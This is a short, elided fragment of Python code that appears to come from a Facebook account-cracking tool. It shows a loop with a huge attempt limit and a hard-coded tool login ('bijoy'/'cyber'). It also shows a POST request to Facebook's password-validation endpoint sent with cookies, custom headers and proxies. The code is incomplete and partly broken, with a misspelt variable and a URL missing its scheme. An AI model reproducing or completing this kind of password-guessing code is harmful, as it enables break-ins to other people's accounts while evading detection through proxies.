...
while attemps < 12345677901:
    ...
    if username == 'bijoy' and password == 'cyber':
...
'x-goog-authuser': '98',}
			...
			po = ses.post('m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
